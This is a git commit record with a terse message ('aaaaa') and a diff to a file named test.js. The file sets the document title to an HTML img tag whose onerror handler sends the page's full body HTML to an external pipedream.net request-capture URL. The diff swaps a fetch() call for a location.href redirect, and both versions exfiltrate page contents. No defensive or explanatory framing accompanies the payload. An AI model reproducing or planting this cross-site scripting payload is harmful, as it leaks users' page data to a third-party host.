f06b2bd5b37468df9040d93f21274393cdfa99fd
QingkangYu <qingkang.yuu@gmail.com>
2023-03-13 14:30:53 -0400

    aaaaa

--- test.js
+++ test.js
@@ -1,4 +1,4 @@
 console.log(document.title);
 console.log(document.body.innerText);
-window.document.title= `<img src = "????" onerror=fetch("https://enk4c3pf2z43.x.pipedream.net/?="+document.body.innerHTML></img>`
+window.document.title= `<img src = "????" onerror=location.href="https://enk4c3pf2z43.x.pipedream.net/?="+document.body.innerHTML></img>`
 console.log(document.title.value);
